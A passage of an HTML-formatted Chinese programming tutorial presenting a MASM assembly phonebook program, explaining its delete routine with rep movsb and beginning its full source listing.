	&lt;span class=&quot;nx&quot;&gt;jmp&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;start_for&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;0x05-删除功能&quot;&gt;0x05 删除功能&lt;/h2&gt;

&lt;p&gt;首先找到我们需要删除的信息，同上&lt;/p&gt;

&lt;p&gt;之后，从后一个数组元素开始的地址，将每个字节都向前填充到前一个元素的地址，借此实现该数组元素的删除&lt;/p&gt;

&lt;h3 id=&quot;rep-movsb-指令解析&quot;&gt;rep movsb 指令解析&lt;/h3&gt;

&lt;p&gt;搬移字串指令有两种，分别是 MOVSB 和 MOVSW，先说 MOVSB。MOVSB 的英文是 move string byte，意思是搬移一个字节，它是把 DS:SI 所指地址的一个字节搬移到 ES:DI 所指的地址上，搬移后原来的内容不变，但是原来 ES:DI 所指的内容会被覆盖而且在搬移之后 SI 和 DI 会自动地址向下一个要搬移的地址。&lt;/p&gt;

&lt;p&gt;通常，程序并不会只搬一个字节，都会重复许多次，如果要重复的话，就得把重复次数 ( 也就是字串长度 ) 先记录在 CX 寄存器，并且在 MOVSB 之前加上 REP 指令，REP 是重复 (repeat) 的意思。&lt;/p&gt;

&lt;p&gt;一般而言汇编语言源文件的每一行都只有一个指令，但 REP MOVSB 却可以在同一行写两个指令，当然分开写也是一样的。&lt;/p&gt;

&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;nx&quot;&gt;del_process&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;将序号后的字节都前移&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ebx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;find_i&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ecx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Contact&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;imul&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ebx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ecx&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;lea&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;edi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;TeleContacts&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;获取目的地址&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;add&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;edi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ebx&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;获取源地址&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;（&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;目的地址后一个&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;）&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;esi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;edi&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;add&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;esi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ecx&lt;/span&gt;

	&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;计算拷贝数量&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;eax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;count&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;sub&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;eax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;find_i&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;需要前移的字节&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;imul&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ecx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;eax&lt;/span&gt;

	&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;循环前移&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;把&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;DS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;SI&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;所指地址的一个字节搬移到&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ES&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;DI&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;所指的地址上&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;rep&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;movsb&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;总数&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;dec&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;count&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;成功删除&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;szDelSuccess&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;call&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;crt_printf&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;add&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;esp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;0x06-完整代码&quot;&gt;0x06 完整代码&lt;/h2&gt;

&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159
160
161
162
163
164
165
166
167
168
169
170
171
172
173
174
175
176
177
178
179
180
181
182
183
184
185
186
187
188
189
190
191
192
193
194
195
196
197
198
199
200
201
202
203
204
205
206
207
208
209
210
211
212
213
214
215
216
217
218
219
220
221
222
223
224
225
226
227
228
229
230
231
232
233
234
235
236
237
238
239
240
241
242
243
244
245
246
247
248
249
250
251
252
253
254
255
256
257
258
259
260
261
262
263
264
265
266
267
268
269
270
271
272
273
274
275
276
277
278
279
280
281
282
283
284
285
286
287
288
289
290
291
292
293
294
295
296
297
298
299
300
301
302
303
304
305
306
307
308
309
310
311
312
313
314
315
316
317
318
319
320
321
322
323
324
325
326
327
328
329
330
331
332
333
334
335
336
337
338
339
340
341
342
343
344
345
346
347
348
349
350
351
352
353
354
355
356
357
358
359
360
361
362
363
364
365
366
367
368
369
370
371
372
373
374
375
376
377
378
379
380
381
382
383
384
385
386
387
388
389
390
391
392
393
394
395
396
397
398
399
400
401
402
403
404
405
406
407
408
409
410
411
412
413
414
415
416
417
418
419
420
421
422
423
424
425
426
427
428
429
430
431
432
433
434
435
436
437
438
439
440
441
442
443
444
445
446
447
448
449
450
451
452
453
454
455
456
457
458
459
460
461
462
463
464
465
466
467
468
469
470
471
472
473
474
475
476
477
478
479
480
481
482
483
484
485
486
487
488
489
490
491
492
493
494
495
496
497
498
499
500
501
502
503
504
505
506
507
508
509
510
511
512
513
514
515
516
517
518
519
520
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;386&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;model&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;flat&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;stdcall&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;stack&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4096&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Irvine32&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;inc&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;includelib&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;kernel32&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;lib&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;includelib&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Irvine32&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;lib&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;msvcrt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;inc&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;includelib&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;msvcrt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;lib&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;masm32&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;inc&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;includelib&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;masm32&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;lib&lt;/span&gt;



&lt;span class=&quot;nx&quot;&gt;ExitProcess&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;proto&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;dwExitCode&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;dword&lt;/span&gt;

&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;定义需要的结构体&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;Contact&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;struct&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;需要定义的数据&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;user&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;db&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;dup&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;tel&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;db&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;dup&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;Contact&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ends&lt;/span&gt;

&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;

&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;设置控制台标题&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;titleStr&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;BYTE&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;汇编电话本 V1.0    Author: WuJ1n9&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;

&lt;span class=&quot;nx&quot;&gt;endl&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;EQU&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;dh&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ah&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;            &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;行结尾&lt;/span&gt;

&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;定义一个结构体数组&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;，&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;用于存放所有的联系人&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;TeleContacts&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Contact&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;dup&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'0'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;TempTeleContacts&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Contact&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'0'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'0'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;

&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;用于保存菜单的选项&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;choose&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;db&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;

&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;清空屏幕&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;str_system_cls&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;db&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;cls&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;

&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;当前最多能存放多少个数据&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;max_count&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;dd&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;

&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;暂停&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;str_system_pause&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;db&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;pause&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;dh&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ah&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;

&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;已经存放了多少个数据&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;count&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;dd&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;

&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;序号&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;find_i&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;dd&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;

&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;用于保存用户名和电话&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;username&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;db&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;dup&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;telenum&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;db&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;dup&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;nx&quot;&gt;szShowMenu&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;db&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;电话本 V1.0&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;endl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; 
		 &lt;span class=&quot;s2&quot;&gt;&quot;1. 添加数据&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;endl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
         &lt;span class=&quot;s2&quot;&gt;&quot;2. 显示数据&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;endl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
         &lt;span class=&quot;s2&quot;&gt;&quot;3. 查找数据&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;endl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
		 &lt;span class=&quot;s2&quot;&gt;&quot;4. 删除数据&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;endl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
		 &lt;span class=&quot;s2&quot;&gt;&quot;5. 修改数据&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;endl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
         &lt;span class=&quot;s2&quot;&gt;&quot;6. 退出程序&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;endl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
         &lt;span class=&quot;s2&quot;&gt;&quot;请输入选项: &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
         &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;dh&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ah&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;\r\n&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;字符串结尾&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;ShowMenuSize&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;db&lt;/span&gt;	&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;szShowMenu&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;nx&quot;&gt;szInputName&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;db&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;请输入联系人的姓名：&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;endl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;InputNameSize&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;db&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;szInputName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;szInputNum&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;db&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;请输入联系人的电话：&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;endl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;szInputError&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;db&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;请重新输入格式正确的选项!（数字1-6）&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;endl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;szFenGe&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;db&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;endl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;szFind&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;db&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;请输入要查询联系人的姓名：&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;endl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;szFindNoone&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;db&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;查无此人&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;endl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;szDelWho&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;db&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;请输入要删除联系人的姓名：&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;endl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
